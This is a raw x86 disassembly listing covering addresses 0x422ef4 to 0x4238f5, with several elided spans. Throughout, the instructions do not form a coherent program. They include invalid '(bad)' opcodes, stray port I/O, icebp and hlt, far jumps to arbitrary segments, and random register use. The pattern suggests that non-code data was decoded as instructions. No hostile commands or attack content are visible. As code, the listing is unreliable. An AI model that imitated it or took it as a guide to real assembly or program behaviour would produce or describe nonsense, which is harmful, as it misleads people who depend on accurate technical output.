  422ef4:	adc    DWORD PTR [ebp-0x78],0x19
  422ef8:	(bad)  
  422efa:	xchg   ebx,eax
  422efb:	fisttp WORD PTR [eax]
  422efd:	mov    eax,0x3776ca33
  422f02:	scas   al,BYTE PTR es:[edi]
  422f03:	mov    al,0x5c
  422f05:	je     0x422f08
  422f07:	add    BYTE PTR [ecx+eax*1],al
  422f0a:	add    BYTE PTR [eax],al
  422f0c:	add    esi,DWORD PTR [eax-0x26]
  422f0f:	jp     0x422ec8
  422f11:	fst    DWORD PTR [edi-0x7d2d6a68]
  422f17:	ret    
  422f18:	shl    DWORD PTR [edx],cl
  422f1a:	pop    ebp
  422f1b:	pop    ebx
  422f1c:	in     eax,0x43
  422f1e:	shl    BYTE PTR [ebp+0x33396d80],1
  422f24:	in     eax,0x7
  422f26:	adc    BYTE PTR [ebx],0xa2
  422f29:	mov    esi,0x1a6f582d
  422f2e:	xchg   DWORD PTR [edi+edx*4],eax
  422f31:	repz jbe 0x422f55
  422f34:	ror    esp,0xc2
  422f37:	pop    ds
  422f38:	scas   eax,DWORD PTR es:[edi]
  422f39:	lods   al,BYTE PTR ds:[esi]
  422f3a:	fisttp QWORD PTR cs:[edx-0x69252c91]
  422f41:	test   eax,0x427da482
  422f46:	sub    dh,dl
  422f48:	addr16 repz loop 0x422f22
  422f4c:	pop    esp
  422f4d:	ins    BYTE PTR es:[edi],dx
  422f4e:	mov    dl,0xfe
  422f50:	stos   DWORD PTR es:[edi],eax
  422f51:	ret    
  422f52:	xchg   edx,eax
  422f53:	mov    bh,0x87
  422f55:	jmp    0xaa14:0x8fc9cc8d
  422f5c:	cmp    al,0x3f
  422f5e:	inc    ebx
  422f5f:	(bad)  
  422f60:	loopne 0x422f3a
  422f62:	ins    BYTE PTR es:[edi],dx
  422f63:	in     eax,0x23
  422f65:	rcr    DWORD PTR [eax+0x1f],cl
  422f68:	aas    
  422f69:	sub    dl,BYTE PTR [edi]
  422f6b:	cli    
  422f6c:	retf   
  422f6d:	fsubr  QWORD PTR [ecx]
  422f6f:	mov    eax,fs
  422f71:	in     eax,0x34
  422f73:	inc    edi
  422f74:	ins    DWORD PTR es:[edi],dx
  422f75:	and    al,0x20
  422f77:	xchg   ecx,eax
  422f78:	sub    dl,0xc1
  422f7b:	and    eax,0x748e89b3
  422f80:	adc    eax,DWORD PTR [ecx+edi*1-0x710e6504]
  422f87:	enter  0x4480,0x38
  422f8b:	pop    ebp
  422f8c:	adc    eax,0x594c6454
  422f91:	in     eax,dx
  422f92:	push   esi
  422f93:	or     ebp,DWORD PTR [ebx+0x2a4496ad]
  422f99:	dec    ebp
  422f9a:	rcl    BYTE PTR [ebp+0x12abc200],1
  422fa0:	or     DWORD PTR [eax+edi*2],ecx
  422fa3:	add    BYTE PTR [eax+0x1a],bh
  422fa6:	sbb    esp,esp
  422fa8:	add    DWORD PTR ds:0xc58f833d,ecx
  422fae:	xchg   BYTE PTR [edx+0x2a],bh
  422fb1:	adc    BYTE PTR [esi+0x74],bh
  422fb4:	mov    esp,0xe2990627
  422fb9:	mov    edi,0xbf5ecf69
  422fbe:	mov    edi,0x5b84b109
  422fc3:	nop
  422fc4:	fsubr  DWORD PTR [ebx]
  422fc6:	jnp    0x422f76
  422fc8:	ja     0x422f5e
  422fca:	xchg   esi,eax
  422fcb:	add    DWORD PTR [edx-0xabdc0a9],edx
  422fd1:	inc    eax
  422fd2:	sub    DWORD PTR [esi+edi*2-0x47],ecx
  422fd6:	arpl   WORD PTR [eax],cx
  422fd8:	sbb    eax,0x49eb697b
  422fdd:	pushf  
  422fde:	jg     0x42302c
  422fe0:	inc    eax
  422fe1:	cwde   
  422fe2:	jno    0x422fbe
  422fe4:	jmp    0xbf78:0x6bf60ba5
  422feb:	popa   
  422fec:	inc    edx
  422fed:	pop    ds
  422fee:	dec    ebp
  422fef:	lods   eax,DWORD PTR ds:[esi]
  422ff0:	or     BYTE PTR [eax-0x7e],bl
  422ff3:	and    eax,0x11296004
  422ff8:	jb     0x42302a
  422ffa:	adc    BYTE PTR [edi-0x377016a6],dl
  423000:	and    DWORD PTR [edi+0x33c33b93],0x3a25c25f
  42300a:	or     eax,DWORD PTR [ebp-0x2c091926]
	...
  423074:	inc    esi
  423075:	in     al,0x62
  423077:	mov    dl,ah
  423079:	mov    gs,esi
  42307b:	out    dx,al
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [esp+eax*8+0x60c4fc22],esp
  423085:	jne    0x423088
  423087:	add    BYTE PTR [ecx+eax*1],al
  42308a:	add    BYTE PTR [eax],al
  42308c:	outs   dx,BYTE PTR ds:[esi]
  42308d:	adc    eax,DWORD PTR [eax-0x4c68d30]
  423093:	cli    
  423094:	in     eax,0x38
  423096:	aas    
  423097:	popf   
  423098:	loop   0x423088
  42309a:	sbb    DWORD PTR [eax],eax
  42309c:	popf   
  42309d:	test   BYTE PTR [ebx+0x57],dl
  4230a0:	les    ebx,FWORD PTR [esi+0x77]
  4230a3:	in     al,dx
  4230a4:	nop
  4230a5:	mov    ch,0x49
  4230a7:	shr    DWORD PTR [ebp-0x48],0xe2
  4230ab:	pop    ds
  4230ac:	fstp   st(5)
  4230ae:	add    eax,0xd43d398c
  4230b3:	and    DWORD PTR [edi],0xffffff80
  4230b6:	idiv   dl
  4230b8:	jge    0x4230b2
  4230ba:	mov    ecx,0xd62d8c1c
  4230bf:	push   ebx
  4230c0:	(bad)  
  4230c1:	je     0x423104
  4230c3:	stos   DWORD PTR es:[edi],eax
  4230c4:	call   0xd84c:0xf19446e2
  4230cb:	sub    cl,BYTE PTR [eax]
  4230cd:	stos   BYTE PTR es:[edi],al
  4230ce:	sbb    BYTE PTR [ebp-0x46],al
  4230d1:	repz sub al,0xf3
  4230d4:	inc    ecx
  4230d5:	sahf   
  4230d6:	aad    0x55
  4230d8:	push   ebp
  4230d9:	adc    al,0xf8
  4230db:	loopne 0x423124
  4230dd:	pop    esi
  4230de:	into   
  4230df:	loop   0x4230d5
  4230e1:	pop    eax
  4230e2:	sub    eax,DWORD PTR [ebp-0x64]
  4230e5:	sub    bh,ah
  4230e7:	test   BYTE PTR [ecx],bl
  4230e9:	rcr    DWORD PTR [eax+0x55bb99f1],0x37
  4230f0:	push   ecx
  4230f1:	jg     0x423075
  4230f3:	test   al,0xc6
  4230f5:	(bad)  
  4230f6:	aaa    
  4230f7:	out    dx,al
  4230f8:	icebp  
  4230f9:	sub    BYTE PTR [ebx+0x4a],bh
  4230fc:	cli    
  4230fd:	pop    ebp
  4230fe:	fs jns 0x423093
  423101:	sub    cl,al
  423103:	push   ds
  423104:	mov    dh,0x5
  423106:	or     eax,0x72051163
  42310b:	imul   ebx,DWORD PTR [ebp-0x46],0x8d92151d
  423112:	jo     0x42311f
  423114:	rcr    DWORD PTR [ecx-0x2a],1
  423117:	ror    ecx,0xb3
  42311a:	inc    esi
  42311b:	or     al,0x60
  42311d:	lds    eax,FWORD PTR [esi+0x88d367e]
  423123:	lahf   
  423124:	sub    DWORD PTR [ecx-0x16a5605e],esp
  42312a:	adc    BYTE PTR [esi+0x73],cl
  42312d:	outs   dx,DWORD PTR ds:[esi]
  42312e:	mov    al,ds:0x6b6dcfa
  423133:	cmp    eax,0x142d3197
  423138:	jmp    0x42318c
  42313a:	test   al,0x26
  42313c:	in     eax,dx
  42313d:	leave  
  42313e:	mov    ch,0x31
  423140:	out    0x85,eax
  423142:	int    0xea
  423144:	xchg   BYTE PTR [ebp+0x33e36ae5],bl
  42314a:	icebp  
  42314b:	popa   
  42314c:	dec    esi
  42314d:	pop    edx
  42314e:	loopne 0x423171
  423150:	pop    ebp
  423151:	ins    DWORD PTR es:[edi],dx
  423152:	ror    DWORD PTR [edx+0x7c573365],cl
  423158:	test   BYTE PTR [esp+ecx*2],cl
  42315b:	(bad)  
  42315c:	bound  ebp,QWORD PTR [edx+eax*1+0x6]
  423160:	push   eax
  423161:	lock and dl,BYTE PTR [ecx+0x53]
  423165:	xchg   edx,eax
  423166:	and    ecx,DWORD PTR [ebx-0x538f74b2]
  42316c:	in     eax,0x70
  42316e:	dec    esi
  42316f:	pop    ss
  423170:	dec    esi
  423171:	cwde   
  423172:	push   es
  423173:	pop    es
  423174:	icebp  
  423175:	pop    ebp
  423176:	lds    ebp,FWORD PTR [ecx+0x25679a50]
  42317c:	nop
  42317d:	pop    esi
  42317e:	and    cl,BYTE PTR [ebx+0x73c052c5]
  423184:	push   ebx
  423185:	pop    esp
  423186:	add    al,bl
  423188:	sub    eax,0xed418b30
  42318d:	xchg   edx,eax
  42318e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42318f:	repnz add BYTE PTR [eax],al
	...
  4231f2:	add    BYTE PTR [eax],al
  4231f4:	jns    0x4231e7
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx+0x72a8c910],esp
  423204:	fs jbe 0x423208
  423207:	add    BYTE PTR [ecx+eax*1],al
  42320a:	add    BYTE PTR [eax],al
  42320c:	xor    al,0xb0
  42320e:	inc    esp
  42320f:	cmovbe ebp,DWORD PTR [ebx-0x154305f4]
  423216:	loopne 0x423278
  423218:	mov    al,0x3c
  42321a:	sbb    ah,cl
  42321c:	adc    al,0xf9
  42321e:	int3   
  42321f:	(bad)  
  423221:	adc    ecx,ebx
  423223:	push   esp
  423224:	xchg   edx,eax
  423225:	dec    ebx
  423226:	das    
  423227:	ins    DWORD PTR es:[edi],dx
  423228:	lea    esp,ds:0xe78f175f
  42322e:	push   ecx
  42322f:	test   al,0x6c
  423231:	scas   eax,DWORD PTR es:[edi]
  423232:	repz jne 0x4231d3
  423235:	jne    0x42328b
  423237:	mov    ch,0xf
  423239:	fnstcw WORD PTR [edx+0x30c14026]
  42323f:	mov    WORD PTR [esp+ecx*4-0x2c],cs
  423243:	(bad)  
  423244:	test   al,0x7b
  423246:	shr    DWORD PTR [edi+0x48e41efc],cl
  42324c:	sub    bl,BYTE PTR [edx]
  42324e:	mov    bl,0x12
  423250:	inc    esp
  423251:	jp     0x4232cc
  423253:	icebp  
  423254:	scas   eax,DWORD PTR es:[edi]
  423255:	xor    BYTE PTR [eax+0x6b],al
  423258:	mov    cl,0xa
  42325a:	sub    BYTE PTR [edi],dl
  42325c:	loop   0x4232ca
  42325e:	outs   dx,BYTE PTR ds:[esi]
  42325f:	dec    ebp
  423260:	call   0x5df349aa
  423265:	adc    DWORD PTR [ecx-0x7],ebp
  423268:	out    0xbb,eax
  42326a:	call   0xdf44:0x4d18c31d
  423271:	dec    edx
  423272:	and    bh,BYTE PTR [ebp+eiz*1+0x3743ec8b]
  423279:	stc    
  42327a:	fsubr  st(3),st
  42327c:	test   eax,0x8f3327b7
  423281:	(bad)  
  423282:	shl    BYTE PTR [ecx+0x1d],1
  423285:	in     al,0xda
  423287:	imul   eax,ebp,0xba3b701b
  42328d:	test   DWORD PTR [edx],eax
  42328f:	xchg   esi,eax
  423290:	test   al,0x47
  423292:	lods   al,BYTE PTR ds:[esi]
  423293:	arpl   di,si
  423295:	or     eax,DWORD PTR [eax+0x75]
  423298:	jle    0x4232a5
  42329a:	push   ss
  42329b:	xchg   esi,eax
  42329c:	in     al,0x46
  42329e:	test   eax,0xafeb79e6
  4232a3:	cmp    ch,BYTE PTR [esi]
  4232a5:	add    DWORD PTR [ebx+0x6528fe4],0xdbf2d151
  4232af:	les    esi,FWORD PTR [ebp+0x331f39b6]
  4232b5:	test   ebx,ebx
  4232b7:	inc    edx
  4232b8:	xchg   esp,eax
  4232b9:	add    eax,0xfbadc31a
  4232be:	mov    ds:0x77d9ce21,al
  4232c3:	pop    ds
  4232c4:	xchg   ebx,eax
  4232c5:	repz pop esp
  4232c7:	adc    eax,0x861edc3d
  4232cc:	ins    DWORD PTR es:[edi],dx
  4232cd:	dec    ebp
  4232ce:	dec    eax
  4232cf:	dec    esi
  4232d0:	out    0x85,eax
  4232d2:	sub    al,0x3
  4232d4:	lods   eax,DWORD PTR ds:[esi]
  4232d5:	xchg   ebx,eax
  4232d6:	outs   dx,DWORD PTR ds:[esi]
  4232d7:	dec    ebx
  4232d8:	repnz inc edx
  4232da:	sub    ecx,DWORD PTR [esi-0x7a824910]
  4232e0:	xchg   ebx,eax
  4232e1:	stc    
  4232e2:	fstp   TBYTE PTR [esi]
  4232e4:	jp     0x423271
  4232e6:	add    DWORD PTR [eax-0x67700b1e],0x5c
  4232ed:	sbb    eax,0x6cba0da1
  4232f2:	push   0xa3962eb3
  4232f7:	push   ecx
  4232f8:	inc    ebp
  4232f9:	add    bl,BYTE PTR [edx+0x15]
  4232fc:	std    
  4232fd:	jecxz  0x4232bd
  4232ff:	jbe    0x423335
  423301:	add    esi,DWORD PTR [ecx]
  423303:	fldenv [edi+0x6d695a1a]
  423309:	les    esp,FWORD PTR [eax]
  42330b:	imul   BYTE PTR [ebp-0x48]
  42330e:	or     eax,0x37
	...
  423373:	add    al,bh
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0x99d60f44
  423382:	push   0x1776842
  423387:	add    BYTE PTR [ecx+eax*1],al
  42338a:	add    BYTE PTR [eax],al
  42338c:	jne    0x4233f1
  42338e:	inc    edx
  42338f:	lea    ebp,[ebx+0x3c]
  423392:	scas   eax,DWORD PTR es:[edi]
  423393:	inc    edx
  423394:	stos   BYTE PTR es:[edi],al
  423395:	cmp    eax,esp
  423397:	test   BYTE PTR [edi-0x6fd6cf73],bh
  42339d:	aam    0x22
  42339f:	inc    edx
  4233a0:	push   0xffffff8b
  4233a2:	fcomp  DWORD PTR [eax]
  4233a4:	enter  0x4914,0x11
  4233a8:	imul   BYTE PTR [edi]
  4233aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233ab:	mov    edx,ss
  4233ad:	jo     0x423388
  4233af:	inc    eax
  4233b0:	jb     0x42335e
  4233b2:	popf   
  4233b3:	adc    cl,dh
  4233b5:	push   ss
  4233b6:	mov    edx,0x651bb8cb
  4233bb:	cmp    al,0x58
  4233bd:	dec    esp
  4233be:	pop    edx
  4233bf:	test   eax,0x7fe714b0
  4233c4:	dec    eax
  4233c5:	and    DWORD PTR [ebx-0x4da2cdba],ebx
  4233cb:	enter  0x978,0x7f
  4233cf:	fdivr  QWORD PTR ss:[ecx]
  4233d2:	lds    esi,FWORD PTR [ebx+0x11b107a1]
  4233d8:	push   0x6f
  4233da:	add    DWORD PTR [esi-0x3c6ce255],ebx
  4233e0:	sbb    BYTE PTR [ebx-0x50d4cab8],al
  4233e6:	iret   
  4233e7:	imul   edx,DWORD PTR [eax],0x48
  4233ea:	sbb    ch,cl
  4233ec:	jmp    0x6b025cfd
  4233f1:	int3   
  4233f2:	retf   
  4233f3:	stos   BYTE PTR es:[edi],al
  4233f4:	in     al,0x4c
  4233f6:	popf   
  4233f7:	add    eax,0x820da83b
  4233fc:	lods   eax,DWORD PTR ds:[esi]
  4233fd:	popa   
  4233fe:	or     DWORD PTR [ecx-0x41],ecx
  423401:	ret    0x35f0
  423404:	mov    ebx,0xe35179f9
  423409:	lea    edi,[ecx-0x61786591]
  42340f:	pop    ss
  423410:	and    eax,0x7d12b83e
  423415:	or     bh,BYTE PTR [eax+0x1e187a8a]
  42341b:	retf   
  42341c:	xchg   ebp,eax
  42341d:	ja     0x42348e
  42341f:	push   edi
  423420:	nop
  423421:	retf   
  423422:	pushf  
  423423:	ins    BYTE PTR es:[edi],dx
  423424:	and    eax,0xe183b7e4
  423429:	jl     0x423454
  42342b:	push   ss
  42342c:	arpl   ax,di
  42342e:	inc    esi
  42342f:	retf   
  423430:	shl    DWORD PTR [ebx+edi*8],0x11
  423434:	sahf   
  423435:	push   cs
  423436:	mov    ebp,0xa2bab995
  42343b:	dec    ecx
  42343c:	in     al,dx
  42343d:	sub    DWORD PTR [ebx],edx
  42343f:	xchg   edx,eax
  423440:	add    DWORD PTR [edi+0x2a],ebx
  423443:	das    
  423444:	pop    es
  423445:	xchg   ecx,eax
  423446:	jmp    0x6375701b
  42344b:	lea    ebx,[esi+0x21]
  42344e:	jge    0x4234bd
  423450:	mov    esi,0x23eb9df9
  423455:	pop    es
  423456:	outs   dx,BYTE PTR ds:[esi]
  423457:	retf   
  423458:	push   cs
  423459:	inc    edx
  42345a:	ret    0x19f6
  42345d:	cwde   
  42345e:	mov    cl,0xdc
  423460:	fcmovu st,st(5)
  423462:	pop    eax
  423463:	repz inc BYTE PTR [esi]
  423466:	pop    esi
  423467:	add    DWORD PTR [ebx-0x42dcbad],ebx
  42346d:	push   ebp
  42346e:	jg     0x423438
  423470:	mov    ecx,0x99555bad
  423475:	scas   eax,DWORD PTR es:[edi]
  423476:	bound  ebp,QWORD PTR ds:0x9241f44
  42347c:	xor    esp,DWORD PTR [esp+eiz*4]
  42347f:	xor    ah,BYTE PTR [edi]
  423481:	in     eax,dx
  423482:	out    0x0,eax
  423484:	dec    eax
  423485:	cmp    eax,0xea723700
  42348a:	lock retf 0x61de
  42348e:	in     al,0x73
	...
  4234f4:	shl    BYTE PTR [eax-0x8a90bb],0xea
  4234fb:	mov    edi,0x1fadf467
  423500:	(bad)  
  423501:	xor    al,0xd9
  423503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423504:	ins    BYTE PTR es:[edi],dx
  423505:	js     0x423508
  423507:	add    BYTE PTR [ecx+eax*1],al
  42350a:	add    BYTE PTR [eax],al
  42350c:	dec    eax
  42350d:	add    al,0x60
  42350f:	shl    BYTE PTR [ebp+0x67610bdb],cl
  423515:	hlt    
  423516:	gs cwde 
  423518:	jnp    0x4234e6
  42351a:	mov    eax,ds:0x4b74b0c4
  42351f:	lea    eax,[edx+0x3b]
  423522:	in     eax,0xfb
  423524:	pop    es
  423525:	mov    ebx,0x207574e9
  42352a:	imul   ecx,DWORD PTR [ebx+0x119650ac],0x7e
  423531:	rcl    edx,cl
  423533:	lods   eax,DWORD PTR ds:[esi]
  423534:	jg     0x42354e
  423536:	jle    0x42358f
  423538:	ficom  WORD PTR [edx+esi*2+0x4ddd406a]
  42353f:	test   al,0x93
  423541:	outs   dx,BYTE PTR ds:[esi]
  423542:	dec    ebx
  423543:	cmp    eax,DWORD PTR [eax-0x4b]
  423546:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423547:	dec    eax
  423548:	cmp    al,0xa9
  42354a:	icebp  
  42354b:	push   cs
  42354c:	dec    ebx
  42354d:	and    dh,ah
  42354f:	pop    edx
  423550:	jl     0x4235b4
  423552:	aaa    
  423553:	push   cs
  423554:	dec    ecx
  423555:	fistp  DWORD PTR [eax+0x5a2273b1]
  42355b:	cmp    cl,dh
  42355d:	add    ebx,edx
  42355f:	fisub  WORD PTR [ecx+0x3aa3b7c1]
  423565:	pop    ss
  423566:	les    edi,FWORD PTR [ebx-0x5a]
  423569:	ins    BYTE PTR es:[edi],dx
  42356a:	pop    ss
  42356b:	adc    DWORD PTR ds:0xa3c919c,esp
  423571:	jg     0x4235df
  423573:	inc    ebx
  423574:	lea    edi,[ebp+0x7]
  423577:	mov    bh,0xf2
  423579:	sbb    dl,BYTE PTR [esp+ebp*2+0x12]
  42357d:	es retf 
  42357f:	push   cs
  423580:	push   ebx
  423581:	xchg   esp,eax
  423582:	pop    es
  423583:	push   ecx
  423584:	loop   0x4235af
  423586:	xchg   ebp,eax
  423587:	das    
  423588:	pop    edi
  423589:	jmp    DWORD PTR [ebx+eiz*2-0x24cdbcab]
  423590:	xchg   ebx,eax
  423591:	push   0xf539533d
  423596:	sbb    al,0xaa
  423598:	je     0x42352c
  42359a:	iret   
  42359b:	rcl    DWORD PTR [edi-0x21],cl
  42359e:	fwait
  42359f:	jne    0x423527
  4235a1:	jns    0x4235b4
  4235a3:	push   cs
  4235a4:	mov    edi,0xb9968902
  4235a9:	jb     0x423606
  4235ab:	les    eax,FWORD PTR [ecx]
  4235ad:	jno    0x423587
  4235af:	clc    
  4235b0:	mov    edx,0x1673c7e5
  4235b5:	push   edx
  4235b6:	ins    BYTE PTR es:[edi],dx
  4235b7:	gs or  al,0xb
  4235ba:	add    DWORD PTR [edx+eax*8],ebx
  4235bd:	imul   ecx,DWORD PTR [ecx],0x34
  4235c0:	loop   0x4235e4
  4235c2:	cld    
  4235c3:	ins    BYTE PTR es:[edi],dx
  4235c4:	add    al,0x49
  4235c6:	and    dh,ch
  4235c8:	adc    al,BYTE PTR [esi+0x5f]
  4235cb:	cs mov esi,0x7c332d36
  4235d1:	or     cl,BYTE PTR [eax-0x366de297]
  4235d7:	mov    cs,WORD PTR [esi-0x3c]
  4235da:	sub    dh,BYTE PTR [ebx]
  4235dc:	stc    
  4235dd:	pop    ss
  4235de:	leave  
  4235df:	loopne 0x423561
  4235e1:	cmp    bl,dl
  4235e3:	fs mov bl,0x9e
  4235e6:	scas   al,BYTE PTR es:[edi]
  4235e7:	xchg   edi,eax
  4235e8:	cld    
  4235e9:	and    al,0x75
  4235eb:	add    bh,0x11
  4235ee:	mov    edi,0xef778b16
  4235f3:	aad    0x3e
  4235f5:	sbb    eax,0x803934d8
  4235fa:	jp     0x423669
  4235fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235fd:	in     al,dx
  4235fe:	push   ecx
  4235ff:	and    eax,0xfcb80df2
  423604:	dec    esi
  423605:	push   ecx
  423606:	dec    esi
  423607:	jge    0x423678
  423609:	nop
  42360a:	inc    edi
  42360b:	dec    ebx
  42360c:	fild   WORD PTR [eax+0x2267]
	...
  423672:	add    BYTE PTR [eax],al
  423674:	or     BYTE PTR [edi-0x8808b84],0x88
  42367b:	jmp    FWORD PTR [esi-0x6f]
  42367e:	jl     0x423693
  423680:	cmp    DWORD PTR [eax+edx*8+0x1797091],ebp
  423687:	add    BYTE PTR [ecx+eax*1],al
  42368a:	add    BYTE PTR [eax],al
  42368c:	js     0x423666
  42368e:	or     DWORD PTR ds:0x313f5a68,esp
  423694:	inc    ebx
  423695:	sbb    DWORD PTR ds:[ecx+0x13],esi
  423699:	jae    0x4236f1
  42369b:	pop    ebx
  42369c:	and    bh,0x5a
  42369f:	and    al,0x34
  4236a1:	adc    esi,edx
  4236a3:	fist   DWORD PTR [edi+0x18]
  4236a6:	mov    edi,0x5f85e3e9
  4236ab:	bound  esp,QWORD PTR [eax-0x1d005585]
  4236b1:	mov    al,0x96
  4236b3:	mov    esp,0xf1cb3731
  4236b8:	je     0x4236ee
  4236ba:	int    0x93
  4236bc:	les    edx,FWORD PTR ds:0xf2df878b
  4236c2:	shl    al,0x77
  4236c5:	xchg   esi,eax
  4236c6:	and    eax,esi
  4236c8:	fwait
  4236c9:	outs   dx,BYTE PTR ds:[esi]
  4236ca:	out    dx,eax
  4236cb:	mov    al,0x59
  4236cd:	add    BYTE PTR [ecx-0x45],dh
  4236d0:	add    edx,ebx
  4236d2:	xlat   BYTE PTR ds:[ebx]
  4236d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236d4:	add    bl,ah
  4236d6:	sbb    eax,0xaadc866b
  4236db:	mov    cl,0x90
  4236dd:	push   ecx
  4236de:	leave  
  4236df:	cmp    eax,0xe165141c
  4236e4:	inc    eax
  4236e5:	mov    ds:0x77c1ad0c,eax
  4236ea:	push   ebp
  4236eb:	add    eax,DWORD PTR [esi+edi*2-0x702a4a91]
  4236f2:	mov    dh,0xe1
  4236f4:	mov    bl,0x2a
  4236f6:	adc    esp,0xc9b2469c
  4236fc:	std    
  4236fd:	retf   0xff4a
  423700:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423701:	rcl    DWORD PTR [eax],cl
  423703:	out    dx,eax
  423704:	addr16 push eax
  423706:	or     esp,DWORD PTR [ebx+0x48]
  423709:	push   ebx
  42370a:	add    eax,0x40719142
  42370f:	stc    
  423710:	pop    edi
  423711:	rcr    DWORD PTR [esi],0xac
  423714:	mov    ebx,0x2f39dd3a
  423719:	fiadd  DWORD PTR [ecx+0x29]
  42371c:	xchg   edi,eax
  42371d:	xchg   DWORD PTR [esi+0x6a21f156],esp
  423723:	jl     0x4236a6
  423725:	add    BYTE PTR [edi+eiz*2+0x702d8bce],bh
  42372c:	(bad)  
  42372e:	ins    BYTE PTR es:[edi],dx
  42372f:	inc    eax
  423730:	dec    edi
  423731:	iret   
  423732:	xor    eax,0xa14afed0
  423737:	push   0xd9afff6f
  42373c:	jbe    0x4236cd
  42373e:	push   ss
  42373f:	in     eax,0x9e
  423741:	push   esp
  423742:	dec    edi
  423743:	shr    BYTE PTR [esi-0x64bd3294],cl
  423749:	lahf   
  42374a:	mov    DWORD PTR [ebx-0x47ac6a3],ebp
  423750:	ret    
  423751:	idiv   al
  423753:	and    BYTE PTR [eax],ch
  423755:	cmp    ah,BYTE PTR [ebp+0x2e]
  423758:	mov    esi,0x1a3784e5
  42375d:	les    esi,FWORD PTR [ecx]
  42375f:	xchg   DWORD PTR [eax+0x68cf3975],esp
  423765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423766:	sbb    eax,0x1218cc25
  42376b:	jnp    0x42373e
  42376d:	cwde   
  42376e:	icebp  
  42376f:	jb     0x4237c1
  423771:	loopne 0x42379c
  423773:	xchg   ebp,eax
  423774:	(bad)  
  423775:	push   ebp
  423776:	or     BYTE PTR [ecx],ch
  423778:	jb     0x42374b
  42377a:	test   ecx,eax
  42377c:	lods   eax,DWORD PTR ds:[esi]
  42377d:	add    al,0x6b
  42377f:	push   edx
  423780:	loop   0x4237e5
  423782:	pop    edx
  423783:	cmp    eax,0x8bce4cdc
  423788:	add    ebx,DWORD PTR [esi+0x4c]
  42378b:	adc    edx,eax
  42378d:	dec    esi
  42378e:	sar    DWORD PTR [esi+0x0],1
	...
  4237f4:	xor    al,0x23
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7a74:0xc6e2add0
  423806:	add    DWORD PTR [eax],eax
  423808:	add    al,0x1
  42380a:	add    BYTE PTR [eax],al
  42380c:	jge    0x423870
  42380e:	cdq    
  42380f:	scas   eax,DWORD PTR es:[edi]
  423810:	call   0xce19:0x968e5165
  423817:	and    ebp,DWORD PTR [esi+0x47]
  42381a:	enter  0x40b1,0x43
  42381e:	scas   eax,DWORD PTR es:[edi]
  42381f:	and    DWORD PTR [ebx+0x73818014],eax
  423825:	fsub   QWORD PTR [eax+ebp*8-0x28]
  423829:	daa    
  42382a:	ret    
  42382b:	sub    esi,esi
  42382d:	xchg   edx,eax
  42382e:	pop    ecx
  42382f:	outs   dx,DWORD PTR ds:[esi]
  423830:	ficom  WORD PTR [edi+eax*1-0x58ec3ad9]
  423837:	push   DWORD PTR [ecx]
  423839:	add    BYTE PTR [ebx+0x5a],dl
  42383c:	int    0xa9
  42383e:	punpckhwd xmm5,XMMWORD PTR [ecx+0x711d4f97]
  423846:	dec    esp
  423847:	mov    ebx,0xf550d92
  42384c:	pop    ebx
  42384d:	pop    ecx
  42384e:	and    eax,0x299259ce
  423853:	mov    eax,ds:0x3834b3ef
  423858:	into   
  423859:	sbb    DWORD PTR [ebp+esi*8+0x1c],esi
  42385d:	lods   eax,DWORD PTR ds:[esi]
  42385e:	sbb    DWORD PTR [ecx],0x29ee333b
  423864:	mov    ecx,ecx
  423866:	in     eax,0xe4
  423868:	or     BYTE PTR [ebx],bh
  42386a:	lds    edx,FWORD PTR [bx+di]
  42386d:	sbb    eax,0xaf778d8
  423872:	je     0x423875
  423874:	jl     0x42381a
  423876:	js     0x4238de
  423878:	push   esp
  423879:	jmp    0x4238a7
  42387b:	inc    esp
  42387c:	ja     0x42381d
  42387e:	pop    ss
  42387f:	lahf   
  423880:	shl    ecx,cl
  423882:	repnz fstp DWORD PTR gs:[ecx+0x4c]
  423887:	es out dx,al
  423889:	stos   DWORD PTR es:[edi],eax
  42388a:	lea    ebx,[esi+0x1b]
  42388d:	pushf  
  42388e:	xchg   esi,eax
  42388f:	mov    bh,0xb7
  423891:	and    esi,esi
  423893:	mov    ebx,?
  423895:	pop    edx
  423896:	sub    ecx,DWORD PTR ds:0x35299c49
  42389c:	lock out 0x73,eax
  42389f:	fcom   DWORD PTR [ebp+0x5f]
  4238a2:	dec    edi
  4238a3:	xchg   edx,eax
  4238a4:	nop    ebp
  4238a7:	inc    eax
  4238a8:	mov    WORD PTR ds:0xefd9fb01,?
  4238ae:	hlt    
  4238af:	push   ss
  4238b0:	pop    edi
  4238b1:	fst    QWORD PTR [eax+eiz*8+0x2a]
  4238b5:	jae    0x423884
  4238b7:	xlat   BYTE PTR ds:[ebx]
  4238b8:	ret    
  4238b9:	loope  0x423899
  4238bb:	in     al,0x38
  4238bd:	cli    
  4238be:	and    BYTE PTR [edi],al
  4238c0:	rcl    BYTE PTR [ebp+ebp*8-0x41cfd452],cl
  4238c7:	hlt    
  4238c8:	ja     0x423882
  4238ca:	std    
  4238cb:	cdq    
  4238cc:	pop    edi
  4238cd:	xchg   DWORD PTR [ecx],esi
  4238cf:	push   esp
  4238d0:	and    ecx,DWORD PTR [edi-0x6b838bf7]
  4238d6:	dec    esp
  4238d7:	call   0xf3aad27e
  4238dc:	mov    ecx,0xb8eb43d9
  4238e1:	cdq    
  4238e2:	imul   esi,DWORD PTR [edi],0xffffff84
  4238e5:	pop    esi
  4238e6:	xchg   esi,eax
  4238e7:	jno    0x423911
  4238e9:	bound  edx,QWORD PTR ds:0xc3d2b1c5
  4238ef:	cmp    al,bl
  4238f1:	popa   
  4238f2:	shr    BYTE PTR [edx+0x38],cl
  4238f5:	and    ebp,DWORD PTR [edi]
